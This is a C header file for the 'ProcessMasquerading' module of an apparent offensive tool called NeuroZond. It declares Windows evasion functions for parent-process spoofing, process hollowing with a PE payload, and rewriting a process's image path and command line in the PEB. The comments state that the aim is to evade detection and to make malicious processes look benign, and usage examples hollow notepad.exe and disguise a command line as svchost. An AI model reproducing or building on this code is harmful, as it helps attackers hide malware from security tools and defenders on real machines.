/**
 * ProcessMasquerading - Advanced process manipulation for NeuroZond
 * 
 * This module implements techniques for masking process identity in Windows:
 * - PPID Spoofing: Makes a process appear to be spawned by a different parent
 * - Process Hollowing: Replaces legitimate process memory with malicious code
 * - PEB Manipulation: Modifies the Process Environment Block to change identity
 * - Command Line Manipulation: Hides the true command line of a process
 *
 * @file process_masquerading.h
 * @author NeuroZond Team
 * @date 2025-04-18
 */

#ifndef NEUROZOND_PROCESS_MASQUERADING_H
#define NEUROZOND_PROCESS_MASQUERADING_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief Finds a process ID by its name
 *
 * Searches through all running processes in the system to find
 * a process with the specified name. The search is case-insensitive.
 *
 * @param processName The name of the process to find (e.g., "explorer.exe")
 * @return The process ID if found, or 0 if no process with the given name exists
 *
 * @note If multiple processes with the same name exist, only the first one found is returned.
 * @warning This function requires access to the system process list. It may fail in high-integrity contexts.
 *
 * Example usage:
 * @code
 * DWORD explorerPid = FindProcessIdByName(L"explorer.exe");
 * if (explorerPid != 0) {
 *     // Process found, use the PID
 * } else {
 *     // Process not found
 * }
 * @endcode
 */
DWORD FindProcessIdByName(const wchar_t* processName);

/**
 * @brief Creates a new process with a spoofed parent process (PPID Spoofing)
 *
 * This function creates a new process that appears to be a child of the
 * specified parent process, rather than the actual process that created it.
 * The technique is known as PPID Spoofing and can be used to evade detection
 * by tools that rely on process creation relationships.
 *
 * @param applicationName Path to the executable file to run
 * @param parentProcessName Name of the process to use as the spoofed parent (e.g., "explorer.exe")
 * @param commandLine Command line arguments for the new process
 * @param processInfo Pointer to a PROCESS_INFORMATION structure that receives info about the new process
 * @return TRUE if successful, FALSE if the operation failed
 *
 * @note The new process is created in a suspended state. To start it, call ResumeThread on its main thread.
 * @warning This technique requires specific privileges (PROCESS_CREATE_PROCESS) on the target parent process.
 *
 * Example usage:
 * @code
 * PROCESS_INFORMATION processInfo = {0};
 * if (SpawnProcessWithSpoofedParent(
 *     L"C:\\Windows\\System32\\cmd.exe",
 *     L"explorer.exe",
 *     L"cmd.exe /c whoami",
 *     &processInfo)) {
 *     // Process created successfully, it will appear to be a child of explorer.exe
 *     ResumeThread(processInfo.hThread); // Start the process
 * } else {
 *     // Failed to create process with spoofed parent
 * }
 * @endcode
 */
BOOL SpawnProcessWithSpoofedParent(
    const wchar_t* applicationName,
    const wchar_t* parentProcessName,
    const wchar_t* commandLine,
    LPPROCESS_INFORMATION processInfo
);

/**
 * @brief Performs process hollowing - replaces a legitimate process with custom code
 *
 * Process hollowing is a technique where a legitimate process is created in a suspended state,
 * its memory is unmapped and replaced with malicious code, and then the process is resumed.
 * This allows execution of arbitrary code under the cover of a legitimate process.
 *
 * @param pi PROCESS_INFORMATION structure for a suspended process
 * @param payload Pointer to a buffer containing a valid PE file to inject
 * @param payloadSize Size of the payload buffer in bytes
 * @return TRUE if hollowing was successful, FALSE otherwise
 *
 * @note The target process must be in a suspended state when calling this function.
 * @warning This is a highly invasive technique that can crash the process if the payload is not compatible.
 * @warning The payload must be a properly formatted PE file that is compatible with the target process (x86/x64).
 *
 * Example usage:
 * @code
 * // First create a suspended process
 * PROCESS_INFORMATION pi = {0};
 * STARTUPINFOW si = {0};
 * si.cb = sizeof(si);
 * if (CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
 *                   CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
 *     // Load the payload from a file or memory
 *     HANDLE hFile = CreateFileW(L"payload.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
 *     if (hFile != INVALID_HANDLE_VALUE) {
 *         DWORD fileSize = GetFileSize(hFile, NULL);
 *         LPVOID payload = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
 *         if (payload) {
 *             DWORD bytesRead = 0;
 *             ReadFile(hFile, payload, fileSize, &bytesRead, NULL);
 *             
 *             // Perform the process hollowing
 *             if (HollowProcess(pi, payload, fileSize)) {
 *                 // The process is now running the injected payload
 *             } else {
 *                 // Hollowing failed, clean up
 *                 TerminateProcess(pi.hProcess, 1);
 *             }
 *             
 *             VirtualFree(payload, 0, MEM_RELEASE);
 *         }
 *         CloseHandle(hFile);
 *     }
 * }
 * @endcode
 */
BOOL HollowProcess(
    PROCESS_INFORMATION pi,
    LPVOID payload,
    SIZE_T payloadSize
);

/**
 * @brief Modifies the process identity by changing the image path in the PEB
 *
 * Changes how a process identifies itself by modifying the ImagePathName
 * field in the Process Environment Block (PEB). This can confuse analysis 
 * tools that rely on this information to identify processes.
 *
 * @param hProcess Handle to the target process
 * @param newImagePath The new image path to set in the PEB
 * @return TRUE if the modification was successful, FALSE otherwise
 *
 * @note This only changes the path in the PEB, not the actual loaded module.
 * @warning This technique requires a handle to the process with appropriate access rights.
 * @warning The process will still behave according to its actual loaded code.
 *
 * Example usage:
 * @code
 * HANDLE hProcess = OpenProcess(
 *     PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
 *     FALSE,
 *     targetPid);
 * if (hProcess) {
 *     if (ModifyProcessIdentity(hProcess, L"C:\\Windows\\System32\\notepad.exe")) {
 *         // The process now appears to be notepad.exe in tools that read the PEB
 *     }
 *     CloseHandle(hProcess);
 * }
 * @endcode
 */
BOOL ModifyProcessIdentity(
    HANDLE hProcess,
    const wchar_t* newImagePath
);

/**
 * @brief Modifies the command line string of a process in its PEB
 *
 * Changes the CommandLine field in the Process Environment Block (PEB)
 * to hide the actual command line arguments used to start the process.
 * This can be useful to conceal sensitive information in command line
 * parameters or to make a process appear benign to analysis tools.
 *
 * @param hProcess Handle to the target process
 * @param newCommandLine The new command line string to set in the PEB
 * @return TRUE if the modification was successful, FALSE otherwise
 *
 * @note This affects only what is visible to tools that read the PEB, not the actual process execution.
 * @warning This technique requires a handle to the process with appropriate access rights.
 * @warning Some security tools may detect this type of manipulation.
 *
 * Example usage:
 * @code
 * HANDLE hProcess = OpenProcess(
 *     PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
 *     FALSE,
 *     targetPid);
 * if (hProcess) {
 *     // Replace potentially suspicious command line with something benign
 *     if (ModifyCommandLine(hProcess, L"svchost.exe -k netsvcs")) {
 *         // Command line has been modified in the PEB
 *     }
 *     CloseHandle(hProcess);
 * }
 * @endcode
 */
BOOL ModifyCommandLine(
    HANDLE hProcess,
    const wchar_t* newCommandLine
);

#ifdef __cplusplus
}
#endif

#endif // NEUROZOND_PROCESS_MASQUERADING_H 